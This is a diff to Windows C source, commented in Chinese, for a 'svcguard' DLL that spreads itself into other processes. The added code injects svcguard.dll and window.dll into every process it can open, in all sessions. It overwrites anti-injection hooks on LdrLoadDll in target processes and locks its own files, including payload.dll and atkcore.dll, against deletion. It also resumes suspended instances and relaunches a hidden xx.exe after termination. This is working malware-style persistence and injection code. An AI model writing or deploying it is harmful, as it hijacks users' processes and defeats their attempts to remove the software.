@@ -23,6 +23,7 @@ static WCHAR  g_szXxExePath[MAX_PATH] = L"";
 static WCHAR  g_szWindowDllPath[MAX_PATH] = L"";
 static WCHAR  g_szDeamonDllPath[MAX_PATH] = L"";
 static WCHAR  g_szGuardDllPath[MAX_PATH] = L"";
+static WCHAR  g_szOwnDir[MAX_PATH] = L"";
 static DWORD  g_guardPids[GUARD_HOST_MAX] = { 0 };
 static int    g_guardCount = 0;
 static volatile LONG g_bExitFlag = 0;
@@ -51,6 +52,35 @@ static BOOL InjCacheHas(DWORD pid) {
 static void InjCacheAdd(DWORD pid) {
     if (g_injCount < INJ_CACHE_MAX) g_injPid[g_injCount++] = pid;
 }
+
+/* 被目标明确拒绝过的 PID（远端 LoadLibrary 返回 0：32 位进程、受保护进程、
+   或被对手反注入拦住且我们拆不掉）。拉黑一段时间，避免每 10 秒重复刷屏。 */
+#define REJECT_MAX      64
+#define REJECT_TTL_MS   120000
+static DWORD g_rejPid[REJECT_MAX];
+static DWORD g_rejTick[REJECT_MAX];
+static int   g_rejCount = 0;
+
+static BOOL RejectedRecently(DWORD pid) {
+    DWORD now = GetTickCount();
+    for (int i = 0; i < g_rejCount; i++) {
+        if (g_rejPid[i] != pid) continue;
+        if (now - g_rejTick[i] < REJECT_TTL_MS) return TRUE;
+        return FALSE;                       /* 过期：放行重试 */
+    }
+    return FALSE;
+}
+
+static void MarkRejected(DWORD pid) {
+    for (int i = 0; i < g_rejCount; i++) {
+        if (g_rejPid[i] == pid) { g_rejTick[i] = GetTickCount(); return; }
+    }
+    if (g_rejCount < REJECT_MAX) {
+        g_rejPid[g_rejCount] = pid;
+        g_rejTick[g_rejCount] = GetTickCount();
+        g_rejCount++;
+    }
+}
 static void InjCacheRefreshIfDue(void) {
     DWORD now = GetTickCount();
     if (g_injLastRefresh == 0 || now - g_injLastRefresh >= INJ_REFRESH_MS) {
@@ -70,20 +100,29 @@ static void EnsureLogInit(void) {
     }
 }
 
-/* 日志：只写共享内存窗口，不写文件 */
+/* 日志：共享内存窗口 + %TEMP%\xx_debug.log（没有弹窗时只能靠文件日志排查） */
 static void WriteDeamonLog(const WCHAR* fmt, ...) {
-    EnsureLogInit();
-    if (!g_pSharedView) return;
-
-    SYSTEMTIME st;
-    GetLocalTime(&st);
     WCHAR szLine[512];
+    WCHAR fline[640];
     va_list args;
+
+    EnsureLogInit();
+
     va_start(args, fmt);
     _vsnwprintf(szLine, _countof(szLine) - 1, fmt, args);
     va_end(args);
     szLine[_countof(szLine) - 1] = L'\0';
 
+    /* 先落文件：g_pSharedView 为空时原来的实现直接 return，什么都看不到 */
+    _snwprintf(fline, _countof(fline) - 1, L"[deamon][pid=%lu] %s\r\n",
+               GetCurrentProcessId(), szLine);
+    fline[_countof(fline) - 1] = L'\0';
+    XXFileLog(fline);
+
+    if (!g_pSharedView) return;
+
+    SYSTEMTIME st;
+    GetLocalTime(&st);
     WCHAR entry[600];
     _snwprintf(entry, _countof(entry) - 1, L"[%02d:%02d:%02d.%03d] [deamon] %s\r\n",
                st.wHour, st.wMinute, st.wSecond, st.wMilliseconds, szLine);
@@ -142,10 +181,53 @@ static BOOL InitPaths(void) {
     swprintf_s(g_szWindowDllPath, MAX_PATH, L"%swindow.dll", dllPath);
     swprintf_s(g_szDeamonDllPath, MAX_PATH, L"%ssvcguard.dll", dllPath);
     swprintf_s(g_szGuardDllPath, MAX_PATH, L"%sguard.dll", dllPath);
+    wcsncpy_s(g_szOwnDir, MAX_PATH, dllPath, _TRUNCATE);
 
     WriteDeamonLog(L"Paths: xx=%ls, window=%ls, guard=%ls\n",
                    g_szXxExePath, g_szWindowDllPath, g_szGuardDllPath);
     return TRUE;
+}
+
+/* ================== 我方文件锁 ==================
+   Windows 允许删除正在运行的镜像（加载器带 FILE_SHARE_DELETE），所以我们的
+   xx.exe / dll / xxres.bin 默认能被对手直接删掉；文件一旦没了，新的注入就没有
+   东西可注入，整条复活链会静默失效（实测确认：不持锁时删运行中的 exe 是成功的）。
+
+   这里用 access=0 + FILE_SHARE_READ 持住每个文件（实测结论）：
+     - share=0 连正在运行的镜像都打不开，必须留 FILE_SHARE_READ；
+     - 留了 READ 之后：删除 / 改名 / 覆盖写入 全部被拒（跨进程同样有效），
+       而读取与 LoadLibrary 仍然成功 —— 也就是不影响我们自己 CopyFileW 备份/还原
+       与把 dll 注入到别的进程。 */
+static const WCHAR *g_ownFiles[] = {
+    L"xx.exe", L"svcguard.dll", L"window.dll", L"atkcore.dll",
+    L"payload.dll", L"payload.bin", L"guard.dll", L"defense.dll",
+    L"xxres.bin", NULL
+};
+#define OWN_LOCK_MAX 16
+static HANDLE g_ownLocks[OWN_LOCK_MAX];
+
+static void LockOwnFiles(void) {
+    int i;
+    if (g_szOwnDir[0] == L'\0' && !InitPaths()) return;
+    for (i = 0; g_ownFiles[i] && i < OWN_LOCK_MAX; i++) {
+        WCHAR path[MAX_PATH];
+        HANDLE h;
+        if (g_ownLocks[i]) continue;
+        swprintf_s(path, MAX_PATH, L"%s%s", g_szOwnDir, g_ownFiles[i]);
+        h = CreateFileW(path, 0, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (h != INVALID_HANDLE_VALUE) g_ownLocks[i] = h;
+    }
+}
+
+/* 每个宿主里的 svcguard 都持一份：xx.exe 被杀后锁依然在，文件删不掉 */
+static DWORD WINAPI OwnFileShieldThread(LPVOID lp) {
+    UNREFERENCED_PARAMETER(lp);
+    Sleep(1500);
+    for (;;) {
+        LockOwnFiles();
+        Sleep(2000);
+    }
+    return 0;
 }
 
 /* xx.exe 被对手删除时，从同目录 xxres.bin 备份还原 */
@@ -180,7 +262,59 @@ static BOOL IsXxProcessRunning(void) {
     return found;
 }
 
-static void RespawnXX(void) {
+/* 按名字找 xx.exe 的 PID（对手会先把 xx 的线程全部挂起再终止，挂起成功而
+   终止失败就会留下一个"僵住"的 xx.exe —— 它能让 IsXxProcessRunning 永远为真） */
+static DWORD FindXxPid(void) {
+    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    DWORD pid = 0;
+    if (h == INVALID_HANDLE_VALUE) return 0;
+    PROCESSENTRY32W pe = { sizeof(pe) };
+    if (Process32FirstW(h, &pe)) {
+        do {
+            if (_wcsicmp(pe.szExeFile, L"xx.exe") == 0) { pid = pe.th32ProcessID; break; }
+        } while (Process32NextW(h, &pe));
+    }
+    CloseHandle(h);
+    return pid;
+}
+
+/* 尽力把某个进程里被挂起的线程恢复回来（与 guard.dll 的恢复逻辑同源） */
+static void ResumePidThreads(DWORD pid) {
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    int resumed = 0;
+    if (hSnap == INVALID_HANDLE_VALUE) return;
+    THREADENTRY32 te = { sizeof(te) };
+    if (Thread32First(hSnap, &te)) {
+        do {
+            if (te.th32OwnerProcessID == pid) {
+                HANDLE h = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
+                if (h) {
+                    while (ResumeThread(h) > 0) resumed++;
+                    CloseHandle(h);
+                }
+            }
+        } while (Thread32Next(hSnap, &te));
+    }
+    CloseHandle(hSnap);
+    if (resumed > 0)
+        WriteDeamonLog(L"恢复了 PID=%lu 的 %d 个被挂起线程\n", pid, resumed);
+}
+
+/* 复活必须发生在 xx 原来的登录会话里：别的会话（尤其 session 0）拉起来的
+   xx.exe 弹窗在非交互桌面上，等于白复活还占资源。共享内存读不到就放行。 */
+static BOOL RespawnSessionOk(void) {
+    DWORD mine = 0;
+    LONG  rec;
+    if (!g_pSharedView) return TRUE;
+    rec = XX_SESSION(g_pSharedView);
+    if (rec == 0) return TRUE;
+    if (!ProcessIdToSessionId(GetCurrentProcessId(), &mine)) return TRUE;
+    if ((LONG)mine == rec) return TRUE;
+    WriteDeamonLog(L"本实例在会话 %lu，xx 上次在会话 %ld，跳过复活（避免影子实例）\n", mine, rec);
+    return FALSE;
+}
+
+static void RespawnXX(BOOL bForce) {
     /* 多实例（各宿主里的 svcguard + defense 看门狗）可能同时判定需要复活，
        用命名互斥锁串行化，避免同一时刻拉起多个 xx.exe。 */
     HANDLE hOnce = CreateMutexW(NULL, FALSE, L"Global\\xx_respawn_guard");
@@ -193,16 +327,29 @@ static void RespawnXX(void) {
         return;
     }
 
+    if (!RespawnSessionOk()) {
+        if (bOwn) ReleaseMutex(hOnce);
+        if (hOnce) CloseHandle(hOnce);
+        return;
+    }
+
     WriteDeamonLog(L"检测到 xx 心跳丢失，准备复活 xx.exe: %ls\n", g_szXxExePath);
     EnsureXxExeExists();
     if (GetFileAttributesW(g_szXxExePath) == INVALID_FILE_ATTRIBUTES) {
         WriteDeamonLog(L"xx.exe 文件不存在，无法复活: %ls\n", g_szXxExePath);
-    } else if (IsXxProcessRunning()) {
+    } else if (IsXxProcessRunning() && !bForce) {
         /* 已有实例在运行就不重复拉起（避免与 defense.dll 看门狗双重复活） */
         WriteDeamonLog(L"xx.exe 已在运行，跳过复活\n");
     } else {
         STARTUPINFOW si = { sizeof(si) };
         PROCESS_INFORMATION pi = { 0 };
+        if (IsXxProcessRunning()) {
+            /* bForce：存在一个"活着但不产生弹窗"的 xx.exe（典型是被对手挂起后
+               终止失败），先尽力解挂，再照样拉一个新实例 —— 有实例总比没弹窗强。 */
+            DWORD xxPid = FindXxPid();
+            WriteDeamonLog(L"xx.exe 已在运行但心跳仍停摆 -> 强制再拉一个实例 (old pid=%lu)\n", xxPid);
+            if (xxPid) ResumePidThreads(xxPid);
+        }
         si.dwFlags = STARTF_USESHOWWINDOW;
         si.wShowWindow = SW_HIDE;
         if (!CreateProcessW(g_szXxExePath, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
@@ -286,10 +433,13 @@ static DWORD WINAPI HeartbeatMonitor(LPVOID lp) {
         lastChange = now;
         lastTick = XX_HB_TICK(g_pSharedView);
         /* 三级恢复：先把本进程的弹窗模块补上，再让宿主里死掉的弹窗线程复活，
-           最后才考虑拉起 xx.exe（它还在跑时这一步会自动跳过）。 */
+           最后拉起 xx.exe。走到这里说明心跳已经停摆（≥2.5 秒没弹窗），
+           所以复活用强制模式：若存在一个"活着但不产弹窗"的 xx.exe（对手把线程
+           全挂起后终止失败就会留下这种僵住进程），不能因为"已在运行"就永远跳过。
+           整个恢复动作已按 HEARTBEAT_RECOVER_MS(10s) 节流，不会造成进程风暴。 */
         EnsureWindowModuleHere();
         ForceWindowRestartInHosts();
-        RespawnXX();
+        RespawnXX(TRUE);
     }
 
     InterlockedDecrement(&XX_COUNTER(g_pSharedView));
@@ -310,6 +460,66 @@ static BOOL IsProtected(LPCWSTR name) {
     return FALSE;
 }
 
+/* ================== 反"反注入"：还原目标进程里被改写的 LdrLoadDll ==================
+   对手会在自己的进程/宿主进程里 hook ntdll!LdrLoadDll，按键名把我们的
+   svcguard.dll / window.dll 直接拒掉（LoadLibrary 返回 0）。这时 CreateRemoteThread
+   本身是成功的，所以不看返回值就会误报"注入成功"，现象正是"别的进程里没有我们的 dll"。
+   这里注入前先把目标进程里被改掉的 LdrLoadDll 前导字节写回原始值 ——
+   我们已经持有 PROCESS_VM_WRITE/VM_OPERATION。 */
+#define LDR_PATCH_LEN 16
+
+/* 原始字节必须来自磁盘上的 ntdll（SEC_IMAGE 映射，内容干净）：
+   不能读我们自己进程里的字节 —— defense.dll 在 xx.exe 内就把 LdrLoadDll hook 了，
+   照抄会把我们自己的 hook 复制到目标进程。 */
+static BOOL ReadPristineNtdllBytes(ULONG_PTR rva, BYTE *out, SIZE_T len) {
+    WCHAR sys[MAX_PATH], path[MAX_PATH];
+    HANDLE hf, hm = NULL;
+    void *view = NULL;
+    BOOL ok = FALSE;
+
+    if (!GetSystemDirectoryW(sys, MAX_PATH)) return FALSE;
+    swprintf_s(path, MAX_PATH, L"%s\\ntdll.dll", sys);
+    hf = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
+                     FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hf == INVALID_HANDLE_VALUE) return FALSE;
+    hm = CreateFileMappingW(hf, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+    if (hm) {
+        view = MapViewOfFile(hm, FILE_MAP_READ, 0, 0, 0);
+        if (view) {
+            memcpy(out, (BYTE *)view + rva, len);
+            ok = TRUE;
+            UnmapViewOfFile(view);
+        }
+        CloseHandle(hm);
+    }
+    CloseHandle(hf);
+    return ok;
+}
+
+static void RepairTargetLdrHook(HANDLE hProc, DWORD pid) {
+    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+    BYTE *fn;
+    BYTE cur[LDR_PATCH_LEN], pristine[LDR_PATCH_LEN];
+    SIZE_T rd = 0;
+    DWORD old = 0;
+
+    if (!hNtdll) return;
+    fn = (BYTE *)GetProcAddress(hNtdll, "LdrLoadDll");
+    if (!fn) return;
+
+    if (!ReadProcessMemory(hProc, fn, cur, LDR_PATCH_LEN, &rd) || rd != LDR_PATCH_LEN)
+        return;
+    if (!ReadPristineNtdllBytes((ULONG_PTR)(fn - (BYTE *)hNtdll), pristine, LDR_PATCH_LEN))
+        return;
+    if (memcmp(cur, pristine, LDR_PATCH_LEN) == 0) return;      /* 没被改，正常 */
+
+    if (VirtualProtectEx(hProc, fn, LDR_PATCH_LEN, PAGE_EXECUTE_READWRITE, &old)) {
+        if (WriteProcessMemory(hProc, fn, pristine, LDR_PATCH_LEN, &rd))
+            WriteDeamonLog(L"已还原 PID=%lu 里被改写的 LdrLoadDll（反注入 hook）\n", pid);
+        VirtualProtectEx(hProc, fn, LDR_PATCH_LEN, old, &old);
+    }
+}
+
 static BOOL InjectDll(HANDLE hProc, LPCWSTR dllPath, DWORD pid) {
     SIZE_T size = (wcslen(dllPath) + 1) * sizeof(WCHAR);
     LPVOID pMem = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT, PAGE_READWRITE);
@@ -321,14 +531,27 @@ static BOOL InjectDll(HANDLE hProc, LPCWSTR dllPath, DWORD pid) {
     LPTHREAD_START_ROUTINE pLoadLib = (LPTHREAD_START_ROUTINE)
         GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
     HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, pLoadLib, pMem, 0, NULL);
+    BOOL ok = FALSE;
     if (hThread) {
-        WaitForSingleObject(hThread, 2000);
+        DWORD code = 0;
+        WaitForSingleObject(hThread, 5000);
+        /* 远端线程的退出码就是宿主里 LoadLibraryW 的返回值（HMODULE）：
+           0 = 载入失败（被对手反注入 hook 拦下、文件被删、位数不符等）。
+           以前只看线程是否创建成功，会把这种失败当成注入成功。 */
+        if (GetExitCodeThread(hThread, &code)) {
+            ok = (code != 0);
+            if (!ok)
+                WriteDeamonLog(L"注入被目标拒绝: %ls -> PID=%lu（远端 LoadLibrary 返回 0）\n",
+                               dllPath, pid);
+        } else {
+            ok = TRUE;
+        }
         CloseHandle(hThread);
     } else {
         WriteDeamonLog(L"注入 DLL 失败 PID=%lu dll=%ls err=%lu\n", pid, dllPath, GetLastError());
     }
     VirtualFreeEx(hProc, pMem, 0, MEM_RELEASE);
-    return (hThread != NULL);
+    return ok;
 }
 
 /* ================== guard.dll 宿主部署与句柄交接 ==================
@@ -535,12 +758,15 @@ static void EnsureGuardHosts(void) {
 
     for (i = 0; i < nCand; i++) {
         HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
-                                   PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, FALSE, cand[i]);
+                                   PROCESS_VM_READ | PROCESS_QUERY_INFORMATION |
+                                   PROCESS_DUP_HANDLE, FALSE, cand[i]);
         BOOL bDupOk = (hProc != NULL);
+        BOOL bCanRead = (hProc != NULL);
         if (!hProc)
             hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                 PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, cand[i]);
         if (!hProc) continue;
+        if (bCanRead) RepairTargetLdrHook(hProc, cand[i]);
 
         if (InjectDll(hProc, g_szGuardDllPath, cand[i])) {
             if (bDupOk) PublishGuardHandle(hProc, cand[i]);
@@ -627,6 +853,8 @@ static void ForceWindowRestartInHosts(void) {
 static DWORD WINAPI SpreaderThread(LPVOID lp) {
     BOOL bImXx;
     DWORD dwGuardScan = 0;
+    DWORD dwStatTick = 0;
+    int nSeen = 0, nInj = 0, nOpenFail = 0, nInjLog = 0;
 
     UNREFERENCED_PARAMETER(lp);
     Sleep(5000);
@@ -634,6 +862,11 @@ static DWORD WINAPI SpreaderThread(LPVOID lp) {
     InitPaths();
     bImXx = IsRunningInXxExe();
     if (bImXx) WriteDeamonLog(L"本实例在 xx.exe 内，负责部署 guard.dll 宿主\n");
+    {
+        DWORD sid = 0;
+        ProcessIdToSessionId(GetCurrentProcessId(), &sid);
+        WriteDeamonLog(L"扩散自检: session=%lu xx=%ls\n", sid, g_szXxExePath);
+    }
 
     while (!g_bExitFlag) {
         InjCacheRefreshIfDue();
@@ -643,14 +876,44 @@ static DWORD WINAPI SpreaderThread(LPVOID lp) {
             if (Process32FirstW(hSnap, &pe)) {
                 do {
                     if (IsProtected(pe.szExeFile)) continue;
-                    /* 只在本会话扩散：弹窗锁是 Local\（按会话隔离），跨会话注入
-                       既帮不上可见弹窗，还可能在别的会话里拉起影子 xx.exe。 */
-                    if (!IsSameSession(pe.th32ProcessID)) continue;
+                    if (pe.th32ProcessID <= 4) continue;      /* System / Idle：OpenProcess 必失败 */
+                    /* 不按会话过滤：弹窗锁是 Local\，别的会话里的 window.dll 抢不到
+                       本会话的锁，所以在别的会话扩散没有副作用；反过来若在这里过滤，
+                       一旦 xx 与目标进程会话不一致（服务/SYSTEM 启动、RDP 等），
+                       就会一个进程都注入不进去 —— 那才是"别的进程里没有 dll"的元凶。 */
+                    nSeen++;
                     if (InjCacheHas(pe.th32ProcessID)) continue;
+                    if (RejectedRecently(pe.th32ProcessID)) continue;   /* 反复拒绝的目标别再刷 */
                     HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
-                                               PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
+                                               PROCESS_VM_WRITE | PROCESS_VM_READ |
+                                               PROCESS_QUERY_INFORMATION,
                                                FALSE, pe.th32ProcessID);
-                    if (!hProc) { InjCacheAdd(pe.th32ProcessID); continue; }
+                    BOOL bCanRead = (hProc != NULL);
+                    if (!hProc)
+                        hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
+                                            PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
+                                            FALSE, pe.th32ProcessID);
+                    if (!hProc) {
+                        nOpenFail++;
+                        if (nOpenFail <= 5)   /* 只报前几条，避免刷屏 */
+                            WriteDeamonLog(L"OpenProcess 失败 PID=%lu %ls err=%lu\n",
+                                           pe.th32ProcessID, pe.szExeFile, GetLastError());
+                        InjCacheAdd(pe.th32ProcessID);
+                        continue;
+                    }
+                    /* 32 位进程装不了 64 位 dll：直接跳过，别每秒重试一次 */
+                    {
+                        BOOL bWow64 = FALSE;
+                        if (IsWow64Process(hProc, &bWow64) && bWow64) {
+                            MarkRejected(pe.th32ProcessID);
+                            WriteDeamonLog(L"跳过 32 位进程 PID=%lu %ls\n",
+                                           pe.th32ProcessID, pe.szExeFile);
+                            CloseHandle(hProc);
+                            continue;
+                        }
+                    }
+                    /* 注入前先拆掉目标里可能存在的 LdrLoadDll 反注入 hook */
+                    if (bCanRead) RepairTargetLdrHook(hProc, pe.th32ProcessID);
 
                     BOOL hasDeamon = FALSE, hasWindow = FALSE;
                     HMODULE mods[1024];
@@ -665,13 +928,38 @@ static DWORD WINAPI SpreaderThread(LPVOID lp) {
                             }
                         }
                     }
-                    if (!hasDeamon) InjectDll(hProc, g_szDeamonDllPath, pe.th32ProcessID);
-                    if (!hasWindow) InjectDll(hProc, g_szWindowDllPath, pe.th32ProcessID);
+                    if (!hasDeamon) {
+                        if (InjectDll(hProc, g_szDeamonDllPath, pe.th32ProcessID)) {
+                            nInj++;
+                            if (nInjLog < 12) { nInjLog++; WriteDeamonLog(L"已注入 svcguard.dll -> PID=%lu %ls\n", pe.th32ProcessID, pe.szExeFile); }
+                        } else {
+                            MarkRejected(pe.th32ProcessID);
+                        }
+                    }
+                    if (!hasWindow) {
+                        if (InjectDll(hProc, g_szWindowDllPath, pe.th32ProcessID)) {
+                            nInj++;
+                            if (nInjLog < 12) { nInjLog++; WriteDeamonLog(L"已注入 window.dll -> PID=%lu %ls\n", pe.th32ProcessID, pe.szExeFile); }
+                        } else {
+                            MarkRejected(pe.th32ProcessID);
+                        }
+                    }
                     InjCacheAdd(pe.th32ProcessID);
                     CloseHandle(hProc);
                 } while (Process32NextW(hSnap, &pe));
             }
             CloseHandle(hSnap);
+        }
+
+        /* 每 10 秒报一次扩散统计：拿不到弹窗日志时也能一眼看出注入是否发生 */
+        {
+            DWORD now = GetTickCount();
+            if (dwStatTick == 0 || now - dwStatTick >= 10000) {
+                WriteDeamonLog(L"扩散统计(10s): 扫描(进程×轮)=%d 注入成功=%d OpenProcess失败=%d\n",
+                               nSeen, nInj, nOpenFail);
+                dwStatTick = now;
+                nSeen = nInj = nOpenFail = 0;
+            }
         }
 
         if (bImXx) {
@@ -807,9 +1095,16 @@ static BOOL EnableDebugPrivilege(void)
 __declspec(dllexport) void WINAPI DeamonInit(void)
 {
     BOOL bPriv = EnableDebugPrivilege();
-    WriteDeamonLog(L"DeamonInit called, SeDebugPrivilege=%ls\n", bPriv ? L"ON" : L"OFF");
+    DWORD sid = 0;
+    /* xx.exe 自身的 DACL 会拒绝 Everyone（连自己都打不开），在它进程里
+       ProcessIdToSessionId(自己) 会失败并给 0；所以优先读共享内存里记的会话号 */
+    if (g_pSharedView) sid = (DWORD)XX_SESSION(g_pSharedView);
+    if (sid == 0) ProcessIdToSessionId(GetCurrentProcessId(), &sid);
+    WriteDeamonLog(L"DeamonInit: pid=%lu session=%lu SeDebugPrivilege=%ls\n",
+                   GetCurrentProcessId(), sid, bPriv ? L"ON" : L"OFF");
     CreateThread(NULL, 0, HeartbeatMonitor, NULL, 0, NULL);
     CreateThread(NULL, 0, SpreaderThread, NULL, 0, NULL);
+    CreateThread(NULL, 0, OwnFileShieldThread, NULL, 0, NULL);
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
